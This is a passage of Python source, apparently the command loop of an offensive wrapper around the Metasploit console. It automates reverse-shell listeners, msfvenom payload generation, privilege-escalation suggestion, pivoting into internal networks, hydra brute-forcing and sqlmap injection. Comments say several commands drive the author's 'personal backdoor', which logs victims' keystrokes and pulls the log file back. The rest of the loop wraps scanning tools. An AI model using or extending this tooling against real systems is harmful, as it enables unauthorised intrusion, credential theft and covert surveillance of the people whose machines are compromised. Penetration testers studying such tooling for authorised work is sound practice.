                            if len(parts) >= 3:
                                msfport = parts[1].strip()
                                job = parts[2].strip()
                                os.write(master, f"set lport {msfport}\n".encode())
                                os.write(master, f"use exploit/multi/handler\n".encode())
                                if defaultset:
                                    os.write(master, f"exploit -j\n".encode())
                                else:
                                    os.write(master, f"show options\n".encode())
                            else:
                                msfport = parts[1].strip()
                                os.write(master, f"set lport {msfport}\n".encode())
                                os.write(master, f"use exploit/multi/handler\n".encode())
                                if defaultset:
                                    os.write(master, f"exploit\n".encode())
                                else:
                                    os.write(master, f"show options\n".encode())

                        elif user_input.lower().startswith("suggester"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/recon/local_exploit_suggester\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("route"):
                            session = int(input("session: "))
                            os.write(master, f"use post/multi/manage/autoroute\n".encode())
                            os.write(master, f"set session {session}\n".encode())
                            os.write(master, f"exploit\n".encode())

                        elif user_input.lower().startswith("schedule"):
                            try:
                                parts = user_input.split(" ", 2)
                                if len(parts) < 3:
                                    print("[-] Invalid input. Use 'schedule [delay(seconds)] [command]'.")
                                    continue

                                delay_input = parts[1].strip().lower()
                                command = parts[2].strip()

                                if not delay_input.isdigit():
                                    print("[-] Delay must be a valid number in seconds.")
                                    continue

                                delay_seconds = int(delay_input)

                                schedule_command_with_delay(command, delay_seconds, master)
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("help"):
                            if not re.search(r"msf", output): #for my reverse shell, comment out if it bothers you
                                os.write(master, b"shelp\n")
                            else:
                                print("[-] Please specify *msfhelp* or *vhelp*")

                        elif user_input.lower().startswith("msfhelp"):
                            os.write(master, b"help\n")

                        elif user_input.lower().startswith("vhelp"):
                            print("\n**CURRENT COMMAND & AVAILABLE MODULES:**\n")
                            print()

                            print("**SELF COMMANDS:**")
                            print("  -vbanner *Displays our awesome banner*")
                            print("  -vhelp *Display this list.*")
                            print("  -exit *Ends the program*")
                            print("  -clear *clears the screen*")
                            print()

                            print("**UTILITY COMMANDS:**")
                            print("  -bash *Enters a bash terminal. The script is still running. Use exit to return*")
                            print("  -qrcode *generates a qrcode for any reason you might want to*")
                            print("  -schedule *delay in seconds* *msfcommand* *schedules a console command to be run at a later time*")
                            print("  -show schedule *displays the scheduled commands*")
                            print("  -cancel last/all *cancel scheduled commands*")
                            print("  -chmac *Changes your MAC address. (Needs Root)*")
                            print("  -generate *generates a reverse shell utilizing msfvenom*")
                            print("  -checkall *Utilizes default values to preform a series of checks and scans on a target website*")
                            print("  -enable/disable defaults *Sets the target and enables utilization of all default values*")
                            print()

                            print("**NETWORK DISCOVERY COMMANDS:**")
                            print("  -arp *Does an ARP scan to discover hosts on the local network. (Needs root)*")
                            print("  -ping *Calls nmap to discover hosts using a ping scan*")
                            print("  -scan *Calls nmap preform a scan of your choosing*")
                            print()

                            print("**WEB APPLICATION DISCOVERY COMMANDS:**")
                            print("  -spider *Crawls the HTML of a target website for interesting endpoints such as .js*")
                            print("  -dbust *Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                            print("  -fuzz *Utilizes ffuf to quickly enumerate endpoints on a target website.*")
                            print("  -sbust *Performs quick subdomain busting utilizing Subfinder to look for subdomains on a target website.*")
                            print("  -checkendpoints *Uses a wordlist to check for commonly vulnerable endpoints on the target website*")
                            print("  -checkports *quickly checks for open ports on a target website*")
                            print()

                            print("**VULNERABILITY SCANNING COMMANDS:**")
                            print("  -vulnwebnikto *Calls nikto for web app vulnerability scanning.*")
                            print("  -vulnport *Calls nmap vulners for port based vulnerability scanning.*")
                            print("  -checkexploits *Checks to see if the target website is vulnerable to one of our exploit scripts.*")
                            print()

                            print("**EXPLOITATION MODULES:**")
                            print("  -login *Utilizes hydra to preform a brute force attack on a login point.*")
                            print("  -sqli *Utilizes sqlmap to attempt sql injection on a target website.*")
                            print("  -vsearch *keywords* *searches our directory of exploit scripts to then execute*")
                            print()

                            print("**METASPLOIT ADDITIONS AND AUTOMATION:**")
                            print("  -listen *port* *Automates exploit/multi/handler*")
                            print("  -route *Automates post/multi/manage/autoroute*")
                            print("  -suggester *Automates post/multi/recon/local_exploit_suggester*")
                            print("  -upgrade *Automates post/multi/manage/shell_to_meterpreter*")
                            print("  -pivot *Utilizes ligolo to set up a route into internal network for non-meterpreter shells*")
                            print("  -show config *displays the current default values*")
                            print("  -update config *updates the default values to save or set*")
                            print("  -load config *loads the saved default values from a file*")
                            print("  -save config *save the current default values to a file*")
                            print("  -set config *enters the default values into metasploit*")
                            print()
                            
                        elif user_input.lower().startswith("clear "):
                            try:
                                os.system('clear')
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("startkeylog"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            if not re.search(r"msf", output):
                                try:
                                    os.write(master, b"startkeylog\n")
                                    color = "\033[92m"
                                    reset_color = "\033[0m"
                                    print(f"{color}[+] logging keystrokes{reset_color}")
                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                        
                        elif user_input.lower().startswith("stopkeylog"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            if not re.search(r"msf", output):
                                try:
                                    os.write(master, b"stopkeylog\n")
                                    print("[-] keylog halted see keyslogged.txt")
                                    download_selection = input(f"would you like to download the file? (y/n) ").strip()
                                    if download_selection.lower().startswith("y"):
                                        try:
                                            filename = "keyslogged.txt"
                                            os.write(master, b"sdownload keyslogged.txt\n")
                                            # Call the receive_file function
                                            receive_file(filename)
                                        except Exception as e:
                                            print(f"[-] Error occurred: {e}")

                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                                
                        elif user_input.lower().startswith("generate"):
                            try:
                                generate_payload()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'sqli' command, use sqlmap to attempt sql injection
                        elif user_input.lower().startswith("sqli"):
                            print("*Utilizes sqlmap to attempt sql injection on a target website.*")
                            try:
                                sqli()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'fuzz' command, use ffuf to enumerate endpoints
                        elif user_input.lower().startswith("fuzz"):
                            print("*Utilizes ffuf to quickly enumerate endpoints on a target website.*")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    fuzz(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    fuzz(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'login' command, utilize hydra to brute force an endpoint
                        elif user_input.lower().startswith("login"):
                            print("*Utilizes hydra to preform a brute force attack on a login point.*")
                            try:
                                login()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'scan' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("scan"):
                            try:
                                print("*Calls nmap preform a scan of your choosing*")
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    scan(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    scan(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'sbust' command, utilize subfinder to find subdomains
                        elif user_input.lower().startswith("sbust"):
                            print("*Performs quick subdomain busting utilizing subfinder to look for subdomains on a target website.*")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    sbust(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    sbust(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'vulnwebnikto' command, utilize nikto to preform a vulnerability scan
                        elif user_input.lower().startswith("vulnwebnikto"):
                            print("*Calls nikto for web app vulnerability scanning.*")
                            print("\nThis scan typically takes 5-15 minutes depending on the complexity of the endpoint.\n")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    vulnwebnikto(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    vulnwebnikto(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'vulnport' command, utilize nmap to preform a vulnerability scan
                        elif user_input.lower().startswith("vulnport"):
                            print("*Calls nmap vulners for port based vulnerability scanning.*")
                            print("\nThis scan typically takes 5-10 minutes per host.")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    vulnport(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    vulnport(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'dbust' command, enter into the directory busting module that utilizes dirb
                        elif user_input.lower().startswith("dbust"):
                            print("*Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                            print("\nDefault wordlist typically takes 10-15 minutes to run through per directory\n")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    dbust(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    dbust(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'spider' command, enter into the url crawling module
                        elif user_input.lower().startswith("spider"):
                            try:
                                print("*Crawls the HTML of a target website for interesting endpoints such as .js*")
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    if globaltargetenabled:
                                        domain = globaltarget
                                        default_spider(domain)
                                    url_input = ""
                                    # Call the csearch function
                                    spider(url_input)
                                elif len(parts) == 2:
                                    domain = parts[1].strip()
                                    # Call the csearch function
                                    default_spider(domain)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'ping' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("ping"):
                            try:
                                print("*Calls nmap to discover hosts using a ping scan*")
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    ping(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    ping(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'arp' command, prompt for IP address and run the scan
                        elif user_input.lower().startswith("arp"):
                            try:
                                print("*Does an ARP scan to discover hosts on the local network. (Needs root)*")
                                arp_function()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        # If user enters the 'chmac' command, show adapters and enter the change mac address module
                        elif user_input.lower().startswith("chmac"):
                            try:
                                print("*Changes your MAC address. (Needs Root)*")
                                print()
                                subprocess.call(['ifconfig'])
                                print()
                                mac_change()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")

                        #If user enters the 'bash' command, spawn a bash terminal
                        elif user_input.lower().startswith("bash"):
                            # Spawn a new shell
                            try:
                                subprocess.call(['/bin/bash'])
                            except Exception as e:
                                print(f"[-] Error occurred: {e}")
        
                        elif user_input.lower().startswith("vbanner"):
                            try:
                                banner()
                            except Exception as e:
                                print(f"[-]Error occurred: {e}")

                        elif user_input.lower().startswith("checkall"):
                            print(f"*Runs default scans & checks*")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    checkall(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    checkall(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-]Error occurred: {e}")

                        elif user_input.lower().startswith("checkexploits"):
                            print("")
                            print(f"*Checks for CVE's that I have an exploit script for*")
                            print("")
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    check_cve_main(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    check_cve_main(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-]Error occurred: {e}")

                        elif user_input.lower().startswith("checkendpoints"):
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                     #Call the csearch function
                                    checkendpoints_main(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                     #Call the csearch function
                                    checkendpoints_main(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().strip().startswith("checkports"):
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    # Call the csearch function
                                    checkports_main(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    # Call the csearch function
                                    checkports_main(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("enable default"):
                            try:
                                parts = user_input.split(" ", 2)
                                if len(parts) in [1, 2]:
                                    url_input = ""
                                    #Call the csearch function
                                    enable_global_target(url_input)
                                elif len(parts) == 3:
                                    url_input = parts[2].strip()
                                    #Call the csearch function
                                    enable_global_target(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("disable default"):
                            try:
                                disable_global_target()
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("vsearch"):
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) != 2:
                                    print("[-] Invalid input please use 'vsearch [keywords]'")
                                    continue
                                search_input = parts[1].strip()
                                # Call the csearch function
                                vsearch(search_input)
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().strip().startswith("qr"):
                            try:
                                parts = user_input.split(" ", 1)
                                if len(parts) == 1:
                                    url_input = ""
                                    generate_qr_code(url_input)
                                elif len(parts) == 2:
                                    url_input = parts[1].strip()
                                    generate_qr_code(url_input)
                                else:
                                    print("[-] Invalid input. Please try again")
                                    continue
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("show schedule"):
                            try:
                                print_scheduled_commands()
                            except Exception as e:
                                print(f"[-] An error occurred: {e}")

                        elif user_input.lower().startswith("cancel last"):
                            try:
                                cancel_scheduled_command(command)
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("cancel all"):
                            try:
                                cancel_all_scheduled_commands()
                            except KeyboardInterrupt:
                                print("[-] KeyboardInterrupt detected. Moving on...")
                                print(" ")
                            except Exception as e:
                                print(f"[-] Error occurred during scan: {e}")

                        elif user_input.lower().startswith("sdownload"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            if not re.search(r"msf", output):
                                try:
                                    os.write(master, user_input.encode())
                                    parts = user_input.split(" ", 1)
                                    filename = parts[1].strip()
                                    # Call the receive_file function
                                    receive_file(filename)
                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                                    
                        elif user_input.lower().startswith("supload"):
                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
                        #comment it out if it bothers you
                            if not re.search(r"msf", output):
                                try:
                                    os.write(master, user_input.encode())
                                    parts = user_input.split(" ", 1)
                                    filename = parts[1].strip()
                                    # Call the send_file function to initiate the upload
                                    send_file(filename)
                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                                    
                        elif user_input.lower().startswith("pivot"):
                            print("*Utilizes ligolo to set up a tunnel into internal network*")
                            print("[+] See https://github.com/Nicocha30/ligolo-ng for the required files and information\n")
                            if not re.search(r"msf", output):
                                try:
                                    route(master)
                                    ligoloup = True
                                except KeyboardInterrupt:
                                    print("[-] KeyboardInterrupt detected. Moving on...")
                                    print(" ")
                                except Exception as e:
                                    print(f"[-] Error occurred: {e}")
                            else:
                                print(f"[-] Non interactive state detected. Please enter an active session")
                        else:
                            os.write(master, user_input.encode())
        finally:
            # Clean up
            os.close(master)
            os.kill(pid, signal.SIGTERM)

if __name__ == "__main__":
    # Execute initial commands to start services
    start_msf()
    main()

